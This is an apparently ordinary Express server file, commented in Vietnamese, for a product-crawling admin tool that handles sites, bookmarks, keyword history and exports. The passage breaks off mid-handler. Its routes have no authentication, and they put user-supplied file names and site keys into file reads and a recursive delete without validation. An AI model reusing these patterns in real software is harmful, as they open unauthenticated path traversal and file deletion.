const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const ProductCrawler = require('./productCrawler');
const BookmarkManager = require('./bookmarkManager');
const KeywordBookmarkManager = require('./keywordBookmarkManager');
const CsvExporter = require('./csvExporter');
const CrawlStateManager = require('./crawlStateManager');
const KeywordHistory = require('./keywordHistory');
const ConfigManager = require('./configManager');
const config = require('./config');

const app = express();


// Khởi tạo ConfigManager
const configManager = new ConfigManager();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Serve static files from assets directory
app.use('/assets', express.static(path.join(__dirname, '..', 'assets')));

// Khởi tạo các manager
const crawler = new ProductCrawler();
const bookmarkManager = new BookmarkManager();
const keywordBookmarkManager = new KeywordBookmarkManager();
const csvExporter = new CsvExporter();
const crawlState = new CrawlStateManager();
const keywordHistory = new KeywordHistory();

// Routes

// Trang chủ - redirect đến index.html trong thư mục admin
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// API Routes

// Lấy danh sách website
app.get('/api/sites', (req, res) => {
  try {
    const websites = configManager.getWebsites();
    res.json({
      success: true,
      data: websites
    });
  } catch (error) {
    // console.error('Error getting sites:', error);
    res.status(500).json({
      success: false,
      message: 'Lỗi khi lấy danh sách website'
    });
  }
});

// Lấy thông tin website hiện tại
app.get('/api/current-site', (req, res) => {
  const siteKey = req.query.siteKey;
  if (!siteKey) {
    return res.status(400).json({
      success: false,
      message: 'Site key is required'
    });
  }

  const site = getWebsites().find(s => s.key === siteKey);
  if (!site) {
    return res.status(404).json({
      success: false,
      message: 'Site not found'
    });
  }

  // Set crawler cho site này
  crawler.setBaseUrl(site.baseUrl);
  bookmarkManager.setSite(siteKey);
  keywordBookmarkManager.setSite(siteKey);
  crawlState.setSite(siteKey);

  res.json({
    success: true,
    data: site
  });
});

// Kiểm tra kết nối API
app.get('/api/test-connection', async (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    
    if (!siteKey) {
      return res.status(400).json({
        success: false,
        message: 'Site key is required'
      });
    }

    const websites = getWebsites();
    
    const site = websites.find(s => s.key === siteKey);
    if (!site) {
      return res.status(404).json({
        success: false,
        message: 'Site not found'
      });
    }

    crawler.setBaseUrl(site.baseUrl);
    const isConnected = await crawler.testConnection(true);

    res.json({
      success: true,
      data: {
        connected: isConnected,
        site: site.name,
        url: site.baseUrl
      }
    });
  } catch (error) {
    // console.error('Error in test-connection:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// API test connection (POST method for site-monitor)
app.post('/api/test-connection', async (req, res) => {
  try {
    const { siteKey } = req.body;
    
    if (!siteKey) {
      return res.status(400).json({
        success: false,
        message: 'Site key is required'
      });
    }

    const site = getWebsites().find(s => s.key === siteKey);
    if (!site) {
      return res.status(404).json({
        success: false,
        message: 'Site not found'
      });
    }

    // Set crawler cho site này
    crawler.setBaseUrl(site.baseUrl);
    const isConnected = await crawler.testConnection(true);

    res.json({
      success: true,
      data: {
        siteKey,
        siteName: site.name,
        baseUrl: site.baseUrl,
        isConnected
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// API lưu lịch sử kiểm tra site
app.post('/api/site-monitor-history', (req, res) => {
  try {
    const { siteKey, status, responseTime, checkTime, error } = req.body;
    
    const historyFile = path.join(__dirname, '..', 'data', 'site_monitor_history.json');
    const historyDir = path.dirname(historyFile);
    
    if (!fs.existsSync(historyDir)) {
      fs.mkdirSync(historyDir, { recursive: true });
    }
    
    let history = [];
    if (fs.existsSync(historyFile)) {
      history = JSON.parse(fs.readFileSync(historyFile, 'utf8'));
    }
    
    const entry = {
      siteKey,
      status,
      responseTime,
      checkTime,
      error,
      timestamp: new Date().toISOString()
    };
    
    history.unshift(entry);
    
    // Giữ chỉ 100 bản ghi gần nhất
    if (history.length > 100) {
      history = history.slice(0, 100);
    }
    
    fs.writeFileSync(historyFile, JSON.stringify(history, null, 2));
    
    res.json({
      success: true,
      message: 'Lịch sử kiểm tra đã được lưu'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// API lấy lịch sử kiểm tra site
app.get('/api/site-monitor-history', (req, res) => {
  try {
    const historyFile = path.join(__dirname, '..', 'data', 'site_monitor_history.json');
    
    if (fs.existsSync(historyFile)) {
      const history = JSON.parse(fs.readFileSync(historyFile, 'utf8'));
      res.json({
        success: true,
        data: history
      });
    } else {
      res.json({
        success: true,
        data: []
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// ==================== WEBSITE MANAGEMENT APIs ====================

// Helper function để lấy danh sách website
function getWebsites() {
  return configManager.getWebsites();
}

// API lấy danh sách website
app.get('/api/websites', (req, res) => {
  try {
    const websites = getWebsites();
    res.json({
      success: true,
      data: websites
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// API thêm website mới
app.post('/api/websites', (req, res) => {
  try {
    const { key, name, baseUrl, banner } = req.body;
    
    // Validation
    if (!key || !name || !baseUrl) {
      return res.status(400).json({
        success: false,
        message: 'Key, name và baseUrl là bắt buộc'
      });
    }
    
    // Thêm website mới
    const newWebsite = configManager.addWebsite({
      key,
      name,
      baseUrl,
      banner: banner || `${name.toUpperCase()} CRAWLER`
    });
    
    res.json({
      success: true,
      data: newWebsite,
      message: 'Website đã được thêm thành công'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// API cập nhật website
app.put('/api/websites/:key', (req, res) => {
  try {
    const { key } = req.params;
    const { name, baseUrl, banner } = req.body;
    
    // Cập nhật website
    const updatedWebsite = configManager.updateWebsite(key, {
      name,
      baseUrl,
      banner
    });
    
    res.json({
      success: true,
      data: updatedWebsite,
      message: 'Website đã được cập nhật thành công'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// API xóa website
app.delete('/api/websites/:key', (req, res) => {
  try {
    const { key } = req.params;
    
    // Xóa website
    const deletedWebsite = configManager.deleteWebsite(key);
    
    // Xóa dữ liệu liên quan (bookmarks, crawl results, etc.)
    const siteDataDir = path.join(__dirname, '..', 'data', key);
    if (fs.existsSync(siteDataDir)) {
      fs.rmSync(siteDataDir, { recursive: true, force: true });
    }
    
    res.json({
      success: true,
      data: deletedWebsite,
      message: 'Website đã được xóa thành công'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// API test kết nối website
app.post('/api/websites/:key/test', async (req, res) => {
  try {
    const { key } = req.params;
    
    const website = configManager.findWebsite(key);
    if (!website) {
      return res.status(404).json({
        success: false,
        message: 'Website không tồn tại'
      });
    }
    
    // Test kết nối
    crawler.setBaseUrl(website.baseUrl);
    const isConnected = await crawler.testConnection(true);
    
    res.json({
      success: true,
      data: {
        key: website.key,
        name: website.name,
        baseUrl: website.baseUrl,
        isConnected,
        testTime: new Date().toISOString()
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Kiểm tra tất cả website
app.get('/api/check-all-sites', async (req, res) => {
  try {
    const results = [];
    
    // Lấy danh sách website từ file hoặc config
    const websites = getWebsites();
    
    for (const site of websites) {
      try {
        crawler.setBaseUrl(site.baseUrl);
        const isConnected = await crawler.testConnection(true);
        
        if (!isConnected) {
          results.push({
            site: site.name,
            status: 'error',
            message: 'Không thể kết nối API'
          });
          continue;
        }

        const products = await crawler.crawlProductsWithRetry(1, 5, 'date', 'desc', 3, true);
        
        if (products.length === 0) {
          results.push({
            site: site.name,
            status: 'error',
            message: 'Không có sản phẩm'
          });
          continue;
        }

        const originalSiteKey = bookmarkManager.siteKey;
        bookmarkManager.setSite(site.key, true);
        const bookmarks = bookmarkManager.getBookmarks();
        bookmarkManager.setSite(originalSiteKey);

        if (bookmarks.length === 0) {
          results.push({
            site: site.name,
            status: 'new',
            message: 'Chưa có bookmark - có thể có sản phẩm mới'
          });
        } else {
          const firstProduct = products[0];
          const isDuplicate = bookmarkManager.isDuplicate(firstProduct);
          
          results.push({
            site: site.name,
            status: isDuplicate ? 'no_new' : 'new',
            message: isDuplicate ? 'Chưa có sản phẩm mới' : 'Có sản phẩm mới!'
          });
        }
      } catch (error) {
        results.push({
          site: site.name,
          status: 'error',
          message: `Lỗi: ${error.message}`
        });
      }
    }

    res.json({
      success: true,
      data: results
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Thu thập dữ liệu
app.post('/api/crawl', async (req, res) => {
  try {
    const { siteKey, maxPages, perPage, orderBy, order } = req.body;

    if (!siteKey) {
      return res.status(400).json({
        success: false,
        message: 'Site key is required'
      });
    }

    const site = getWebsites().find(s => s.key === siteKey);
    if (!site) {
      return res.status(404).json({
        success: false,
        message: 'Site not found'
      });
    }

    // Set crawler cho site này
    crawler.setBaseUrl(site.baseUrl);
    bookmarkManager.setSite(siteKey);
    keywordBookmarkManager.setSite(siteKey);
    crawlState.setSite(siteKey);

    // Kiểm tra kết nối
    const isConnected = await crawler.testConnection(true);
    if (!isConnected) {
      return res.status(400).json({
        success: false,
        message: 'Không thể kết nối API'
      });
    }

    // Thu thập dữ liệu
    const products = await crawler.crawlProductsWithRetry(
      maxPages || config.defaultConfig.maxPages,
      perPage || config.defaultConfig.perPage,
      orderBy || config.defaultConfig.orderBy,
      order || config.defaultConfig.order
    );

    // Xử lý duplicate và bookmark
    let duplicateCount = 0;
    let newBookmarkCount = 0;
    const lastTriplet = crawlState.getLastTriplet();
    const duplicateWindow = [];
    const currentTripletNew = [];
    const recentBookmarks = bookmarkManager.getBookmarks().map(b => b.permalink);

    for (const product of products) {
      if (bookmarkManager.isDuplicate(product)) {
        duplicateCount++;
        bookmarkManager.markAsDuplicate(product);
        duplicateWindow.push(product.permalink);
        if (duplicateWindow.length > 3) duplicateWindow.shift();
      } else {
        newBookmarkCount++;
        if (currentTripletNew.length < 3) {
          currentTripletNew.push(product.permalink);
        }
        duplicateWindow.length = 0;
      }
    }

    // Lưu bookmark mới
    bookmarkManager.clearBookmarks();
    const firstFiveProducts = products.slice(0, 5);
    for (const product of firstFiveProducts) {
      bookmarkManager.addBookmark(product);
    }

    // Lưu triplet mới
    if (currentTripletNew.length === 3) {
      crawlState.saveNewTriplet(currentTripletNew);
    }

    // Lưu kết quả crawl vào file
    const crawlResultsFile = path.join(__dirname, '..', 'data', siteKey, 'crawlResults.json');
    const crawlResultsDir = path.dirname(crawlResultsFile);
    
    if (!fs.existsSync(crawlResultsDir)) {
      fs.mkdirSync(crawlResultsDir, { recursive: true });
    }
    
    const crawlData = {
      siteKey,
      crawlDate: new Date().toISOString(),
      totalProducts: products.length,
      newBookmarkCount,
      duplicateCount,
      products: products
    };
    
    fs.writeFileSync(crawlResultsFile, JSON.stringify(crawlData, null, 2));

    res.json({
      success: true,
      data: {
        totalProducts: products.length,
        newBookmarkCount,
        duplicateCount,
        totalBookmarks: bookmarkManager.getBookmarkCount(),
        products: products.slice(0, 10) // Chỉ trả về 10 sản phẩm đầu tiên
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Thu thập dữ liệu theo từ khóa
app.post('/api/crawl-keyword', async (req, res) => {
  try {
    const { siteKey, keyword, maxPages, perPage, orderBy, order } = req.body;

    if (!siteKey || !keyword) {
      return res.status(400).json({
        success: false,
        message: 'Site key and keyword are required'
      });
    }

    const site = getWebsites().find(s => s.key === siteKey);
    if (!site) {
      return res.status(404).json({
        success: false,
        message: 'Site not found'
      });
    }

    // Set crawler cho site này
    crawler.setBaseUrl(site.baseUrl);
    bookmarkManager.setSite(siteKey);
    keywordBookmarkManager.setSite(siteKey);
    crawlState.setSite(siteKey);

    // Kiểm tra kết nối
    const isConnected = await crawler.testConnection(true);
    if (!isConnected) {
      return res.status(400).json({
        success: false,
        message: 'Không thể kết nối API'
      });
    }

    // Thu thập dữ liệu
    const allProducts = await crawler.crawlProductsWithRetry(
      maxPages || config.defaultConfig.maxPages,
      perPage || config.defaultConfig.perPage,
      orderBy || config.defaultConfig.orderBy,
      order || config.defaultConfig.order
    );

    // Lọc sản phẩm theo từ khóa
    const keywordLower = keyword.toLowerCase();
    const filteredProducts = allProducts.filter(product => {
      const name = (product.name || '').toLowerCase();
      const description = (product.description || '').toLowerCase();
      const shortDescription = (product.short_description || '').toLowerCase();
      const categories = Array.isArray(product.categories) 
        ? product.categories.map(cat => (cat.name || '').toLowerCase()).join(' ')
        : '';
      const tags = Array.isArray(product.tags)
        ? product.tags.map(tag => (tag.name || '').toLowerCase()).join(' ')
        : '';
      
      return name.includes(keywordLower) || 
             description.includes(keywordLower) || 
             shortDescription.includes(keywordLower) ||
             categories.includes(keywordLower) ||
             tags.includes(keywordLower);
    });

    // Lưu từ khóa vào lịch sử
    keywordHistory.addKeyword(keyword, siteKey, filteredProducts.length);

    // Xử lý duplicate và bookmark cho từ khóa
    let duplicateCount = 0;
    let newBookmarkCount = 0;

    for (const product of filteredProducts) {
      if (keywordBookmarkManager.isDuplicate(product, keyword)) {
        duplicateCount++;
        keywordBookmarkManager.markAsDuplicate(product, keyword);
      } else {
        newBookmarkCount++;
        keywordBookmarkManager.addBookmark(product, keyword);
      }
    }

    // Lưu kết quả keyword search vào file
    const keywordResultsFile = path.join(__dirname, '..', 'data', siteKey, `keyword_${keyword.replace(/[^a-zA-Z0-9]/g, '_')}_results.json`);
    const keywordResultsDir = path.dirname(keywordResultsFile);
    
    if (!fs.existsSync(keywordResultsDir)) {
      fs.mkdirSync(keywordResultsDir, { recursive: true });
    }
    
    const keywordData = {
      siteKey,
      keyword,
      searchDate: new Date().toISOString(),
      totalProducts: allProducts.length,
      filteredProducts: filteredProducts.length,
      newBookmarkCount,
      duplicateCount,
      products: filteredProducts // Lưu TẤT CẢ sản phẩm đã lọc
    };
    
    fs.writeFileSync(keywordResultsFile, JSON.stringify(keywordData, null, 2));

    res.json({
      success: true,
      data: {
        keyword,
        totalProducts: allProducts.length,
        filteredProducts: filteredProducts.length,
        newBookmarkCount,
        duplicateCount,
        totalBookmarks: keywordBookmarkManager.getBookmarkCountByKeyword(keyword),
        products: filteredProducts.slice(0, 10) // Chỉ trả về 10 sản phẩm đầu tiên cho hiển thị
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Lấy thống kê bookmark
app.get('/api/stats', (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    // Luôn lấy thống kê tổng hợp từ tất cả website
    const websites = configManager.getWebsites();
    
    let totalBookmarks = 0;
    let totalNewBookmarks = 0;
    let totalDuplicates = 0;

    websites.forEach(site => {
      bookmarkManager.setSite(site.key);
      const bookmarks = bookmarkManager.getBookmarks();
      const siteBookmarks = bookmarks.length;
      const siteDuplicates = bookmarks.filter(b => b.isDuplicate).length;
      const siteNewBookmarks = siteBookmarks - siteDuplicates;
      
      totalBookmarks += siteBookmarks;
      totalNewBookmarks += siteNewBookmarks;
      totalDuplicates += siteDuplicates;
    });

    res.json({
      success: true,
      data: {
        totalBookmarks,
        newBookmarks: totalNewBookmarks,
        duplicates: totalDuplicates,
        duplicateRate: totalBookmarks > 0 ? ((totalDuplicates / totalBookmarks) * 100).toFixed(2) : 0
      }
    });
  } catch (error) {
    // console.error('Error in /api/stats:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Lấy thống kê bookmark theo từ khóa
app.get('/api/keyword-stats', (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    if (!siteKey) {
      return res.status(400).json({
        success: false,
        message: 'Site key is required'
      });
    }

    keywordBookmarkManager.setSite(siteKey);
    const stats = keywordBookmarkManager.getKeywordStats();
    const keywords = keywordBookmarkManager.getKeywords();

    res.json({
      success: true,
      data: {
        keywords,
        stats,
        totalBookmarks: keywordBookmarkManager.getBookmarkCount()
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Lấy lịch sử từ khóa
app.get('/api/keyword-history', (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    
    let allHistory, siteHistory, popularKeywords;
    
    if (siteKey) {
      // Lấy lịch sử cho site cụ thể
      allHistory = keywordHistory.getAllHistory();
      siteHistory = keywordHistory.getHistoryBySite(siteKey);
      popularKeywords = keywordHistory.getPopularKeywords(siteKey);
    } else {
      // Lấy tất cả lịch sử từ khóa
      allHistory = keywordHistory.getAllHistory();
      siteHistory = allHistory; // Tất cả lịch sử
      popularKeywords = keywordHistory.getPopularKeywords(); // Tất cả từ khóa phổ biến
    }

    res.json({
      success: true,
      data: {
        allHistory,
        siteHistory,
        popularKeywords
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Lấy danh sách bookmark
app.get('/api/bookmarks', (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    if (!siteKey) {
      return res.status(400).json({
        success: false,
        message: 'Site key is required'
      });
    }

    bookmarkManager.setSite(siteKey);
    const bookmarks = bookmarkManager.getBookmarks();

    res.json({
      success: true,
      data: bookmarks
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Lấy danh sách bookmark theo từ khóa
app.get('/api/keyword-bookmarks', (req, res) => {
  try {
    const { siteKey, keyword } = req.query;
    if (!siteKey || !keyword) {
      return res.status(400).json({
        success: false,
        message: 'Site key and keyword are required'
      });
    }

    keywordBookmarkManager.setSite(siteKey);
    const bookmarks = keywordBookmarkManager.getBookmarksByKeyword(keyword);

    res.json({
      success: true,
      data: bookmarks
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Xóa bookmark
app.delete('/api/bookmarks', (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    if (!siteKey) {
      return res.status(400).json({
        success: false,
        message: 'Site key is required'
      });
    }

    bookmarkManager.setSite(siteKey);
    bookmarkManager.clearBookmarks();

    res.json({
      success: true,
      message: 'Đã xóa tất cả bookmark'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Xóa bookmark theo từ khóa
app.delete('/api/keyword-bookmarks', (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    if (!siteKey) {
      return res.status(400).json({
        success: false,
        message: 'Site key is required'
      });
    }

    keywordBookmarkManager.setSite(siteKey);
    keywordBookmarkManager.clearBookmarks();

    res.json({
      success: true,
      message: 'Đã xóa tất cả bookmark từ khóa'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Xóa lịch sử từ khóa
app.delete('/api/keyword-history', (req, res) => {
  try {
    keywordHistory.clearHistory();

    res.json({
      success: true,
      message: 'Đã xóa tất cả lịch sử từ khóa'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Xuất CSV
app.post('/api/export-csv', async (req, res) => {
  try {
    const { siteKey, products, exportType } = req.body;

    if (!siteKey || !products) {
      return res.status(400).json({
        success: false,
        message: 'Site key and products are required'
      });
    }

    bookmarkManager.setSite(siteKey);
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `products_${siteKey}_${timestamp}.csv`;
    const filepath = path.join(__dirname, '..', 'exports', filename);

    // Tạo thư mục exports nếu chưa có
    if (!fs.existsSync(path.join(__dirname, '..', 'exports'))) {
      fs.mkdirSync(path.join(__dirname, '..', 'exports'), { recursive: true });
    }

    let success = false;
    if (exportType === 'highlight') {
      success = await csvExporter.exportToCsvWithHighlight(products, bookmarkManager, filepath);
    } else {
      success = await csvExporter.exportToCsv(products, bookmarkManager, filepath);
    }

    if (success) {
      res.json({
        success: true,
        data: {
          filename,
          filepath,
          message: 'Xuất CSV thành công'
        }
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Lỗi khi xuất CSV'
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Xuất CSV theo từ khóa
app.post('/api/export-csv-keyword', async (req, res) => {
  try {
    const { siteKey, keyword, products } = req.body;

    if (!siteKey || !keyword || !products) {
      return res.status(400).json({
        success: false,
        message: 'Site key, keyword and products are required'
      });
    }

    keywordBookmarkManager.setSite(siteKey);
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `products_${siteKey}_${keyword.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.csv`;
    const filepath = path.join(__dirname, '..', 'exports', filename);

    // Tạo thư mục exports nếu chưa có
    if (!fs.existsSync(path.join(__dirname, '..', 'exports'))) {
      fs.mkdirSync(path.join(__dirname, '..', 'exports'), { recursive: true });
    }

    const success = await csvExporter.exportToCsvWithKeyword(products, keywordBookmarkManager, keyword, filepath);

    if (success) {
      res.json({
        success: true,
        data: {
          filename,
          filepath,
          message: 'Xuất CSV theo từ khóa thành công'
        }
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Lỗi khi xuất CSV theo từ khóa'
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Serve HTML files from html directory
app.get('/html/:filename', (req, res) => {
  const filename = req.params.filename;
  res.sendFile(path.join(__dirname, '..', 'html', filename));
});

// API mới cho xuất dữ liệu (tương thích với frontend modular)
app.post('/api/export-data', async (req, res) => {
  try {
    const { siteKey, format, dateFrom, dateTo, productStatus, maxRecords, fields, keyword, products } = req.body;

    if (!siteKey) {
      return res.status(400).json({
        success: false,
        message: 'Site key is required'
      });
    }

    const site = getWebsites().find(s => s.key === siteKey);
    if (!site) {
      return res.status(404).json({
        success: false,
        message: 'Site not found'
      });
    }

    // Xử lý dữ liệu sản phẩm
    let productsData = [];
    
    // Nếu có keyword, lấy dữ liệu từ file keyword results
    if (keyword) {
      const keywordResultsFile = path.join(__dirname, '..', 'data', siteKey, `keyword_${keyword.replace(/[^a-zA-Z0-9]/g, '_')}_results.json`);
      
      if (fs.existsSync(keywordResultsFile)) {
        const keywordData = JSON.parse(fs.readFileSync(keywordResultsFile, 'utf8'));
        productsData = keywordData.products || [];
      } else {
        productsData = [];
      }
    }
    // Nếu có products từ frontend (fallback), sử dụng dữ liệu đó
    else if (products && Array.isArray(products)) {
      productsData = products;
    } else {
      // Lấy dữ liệu sản phẩm từ kết quả crawl
      const crawlResultsFile = path.join(__dirname, '..', 'data', siteKey, 'crawlResults.json');
      
      if (fs.existsSync(crawlResultsFile)) {
        const crawlData = JSON.parse(fs.readFileSync(crawlResultsFile, 'utf8'));
        productsData = crawlData.products || [];
      } else {
        // Fallback: lấy từ bookmark nếu không có crawl results
        bookmarkManager.setSite(siteKey);
        productsData = bookmarkManager.getBookmarks();
      }
    }

    // Lọc theo ngày (chỉ áp dụng cho bookmark, không áp dụng cho crawl results hoặc keyword search)
    if (!products || !Array.isArray(products)) {
      const crawlResultsFile = path.join(__dirname, '..', 'data', siteKey, 'crawlResults.json');
      if (fs.existsSync(crawlResultsFile)) {
        // Không lọc theo ngày cho crawl results vì tất cả đều là sản phẩm mới crawl
      } else {
        // Lọc theo ngày cho bookmark
        if (dateFrom) {
          productsData = productsData.filter(p => new Date(p.addedAt) >= new Date(dateFrom));
        }
        if (dateTo) {
          productsData = productsData.filter(p => new Date(p.addedAt) <= new Date(dateTo + 'T23:59:59'));
        }
      }
    }

    // Lọc theo trạng thái
    if (productStatus === 'new') {
      productsData = productsData.filter(p => !p.isDuplicate);
    } else if (productStatus === 'duplicate') {
      productsData = productsData.filter(p => p.isDuplicate);
    }

    // Giới hạn số bản ghi
    if (maxRecords && maxRecords > 0) {
      productsData = productsData.slice(0, maxRecords);
    }

    // Tạo file
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    let filename;
    if (keyword) {
      filename = `export_${siteKey}_${keyword.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.${format}`;
    } else {
      filename = `export_${siteKey}_${timestamp}.${format}`;
    }
    const filepath = path.join(__dirname, '..', 'exports', filename);
    

    // Tạo thư mục exports nếu chưa có
    const exportsDir = path.join(__dirname, '..', 'exports');
    if (!fs.existsSync(exportsDir)) {
      fs.mkdirSync(exportsDir, { recursive: true });
    }

    let success = false;
    if (format === 'csv') {
      success = await csvExporter.exportToCsv(productsData, bookmarkManager, filepath);
    } else if (format === 'json') {
      const jsonData = JSON.stringify(productsData, null, 2);
      fs.writeFileSync(filepath, jsonData, 'utf8');
      success = true;
    }

    if (success) {
      // Lưu lịch sử xuất
      const exportHistory = {
        id: Date.now().toString(),
        filename,
        siteKey,
        siteName: site.name,
        format,
        recordCount: productsData.length,
        fileSize: fs.statSync(filepath).size,
        exportDate: new Date().toISOString(),
        status: 'completed',
        downloadUrl: `/exports/${filename}`
      };

      // Lưu vào file lịch sử
      const historyFile = path.join(exportsDir, 'export_history.json');
      let history = [];
      if (fs.existsSync(historyFile)) {
        history = JSON.parse(fs.readFileSync(historyFile, 'utf8'));
      }
      history.unshift(exportHistory);
      fs.writeFileSync(historyFile, JSON.stringify(history, null, 2));

      res.json({
        success: true,
        data: {
          filename,
          downloadUrl: `/exports/${filename}`,
          recordCount: productsData.length,
          message: 'Data exported successfully'
        }
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Failed to export data'
      });
    }
  } catch (error) {
    // console.error('Export data error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// API lấy lịch sử xuất dữ liệu
app.get('/api/export-history', (req, res) => {
  try {
    const historyFile = path.join(__dirname, '..', 'exports', 'export_history.json');
    
    if (fs.existsSync(historyFile)) {
      const history = JSON.parse(fs.readFileSync(historyFile, 'utf8'));
      
      // Lọc chỉ những file thực sự tồn tại
      const validHistory = history.filter(item => {
        const filepath = path.join(__dirname, '..', 'exports', item.filename);
        return fs.existsSync(filepath);
      });
      
      // Cập nhật lại file history nếu có file bị xóa
      if (validHistory.length !== history.length) {
        fs.writeFileSync(historyFile, JSON.stringify(validHistory, null, 2));
      }
      
      res.json({
        success: true,
        data: validHistory
      });
    } else {
      res.json({
        success: true,
        data: []
      });
    }
  } catch (error) {
    // console.error('Get export history error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// API lấy thống kê xuất dữ liệu
app.get('/api/export-statistics', async (req, res) => {
  try {
    let totalProducts = 0;
    let newProducts = 0;
    let duplicateProducts = 0;
    const websites = configManager.getWebsites();
    let totalSites = websites.length;

    // Đếm sản phẩm từ tất cả sites
    for (const site of websites) {
      bookmarkManager.setSite(site.key);
      const bookmarks = bookmarkManager.getBookmarks();
      totalProducts += bookmarks.length;
      newProducts += bookmarks.filter(b => !b.isDuplicate).length;
      duplicateProducts += bookmarks.filter(b => b.isDuplicate).length;
    }

    res.json({
      success: true,
      data: {
        totalProducts,
        newProducts,
        duplicateProducts,
        totalSites
      }
    });
  } catch (error) {
    // console.error('Get export statistics error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// API tải file xuất
app.get('/exports/:filename', (req, res) => {
  try {
    const filename = req.params.filename;
    const filepath = path.join(__dirname, '..', 'exports', filename);
    
    
    if (fs.existsSync(filepath)) {
      // Set headers để tải file về máy tính
      res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
      res.setHeader('Content-Type', 'application/octet-stream');
      res.download(filepath, filename, (err) => {
        if (err) {
          // console.error('Download error:', err);
          res.status(500).json({
            success: false,
            message: 'Error downloading file'
          });
        } else {
        }
      });
    } else {
      res.status(404).json({
        success: false,
        message: 'File not found'
      });
    }
  } catch (error) {
    // console.error('Download file error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// API lấy tất cả bookmark (cho xuất dữ liệu)
app.get('/api/bookmarks', async (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    
    if (!siteKey) {
      return res.status(400).json({
        success: false,
        message: 'Site key is required'
      });
    }

    bookmarkManager.setSite(siteKey);
    const bookmarks = bookmarkManager.getBookmarks();

    res.json({
      success: true,
      data: bookmarks
    });
  } catch (error) {
    // console.error('Get bookmarks error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// API xóa tất cả bookmark
app.delete('/api/bookmarks', async (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    
    if (!siteKey) {
      return res.status(400).json({
        success: false,
        message: 'Site key is required'
      });
    }

    bookmarkManager.setSite(siteKey);
    bookmarkManager.clearBookmarks();

    res.json({
      success: true,
      message: 'All bookmarks cleared successfully'
    });
  } catch (error) {
    // console.error('Clear bookmarks error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// API xóa bookmark theo ID
app.delete('/api/bookmarks/:id', async (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    const bookmarkId = req.params.id;
    
    if (!siteKey || !bookmarkId) {
      return res.status(400).json({
        success: false,
        message: 'Site key and bookmark ID are required'
      });
    }

    bookmarkManager.setSite(siteKey);
    const success = await bookmarkManager.removeBookmark(bookmarkId);

    if (success) {
      res.json({
        success: true,
        message: 'Bookmark deleted successfully'
      });
    } else {
      res.status(404).json({
        success: false,
        message: 'Bookmark not found'
      });
    }
  } catch (error) {
    // console.error('Delete bookmark error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// API cập nhật bookmark
app.put('/api/bookmarks/:id', async (req, res) => {
  try {
    const siteKey = req.query.siteKey;
    const bookmarkId = req.params.id;
    const updateData = req.body;
    
    if (!siteKey || !bookmarkId) {
      return res.status(400).json({
        success: false,
        message: 'Site key and bookmark ID are required'
      });
    }

    bookmarkManager.setSite(siteKey);
    const success = bookmarkManager.updateBookmark(bookmarkId, updateData);

    if (success) {
      res.json({
        success: true,
        message: 'Bookmark updated successfully'
      });
    } else {
      res.status(404).json({
        success: false,
        message: 'Bookmark not found'
      });
    }
  } catch (error) {
    // console.error('Update bookmark error:', error);
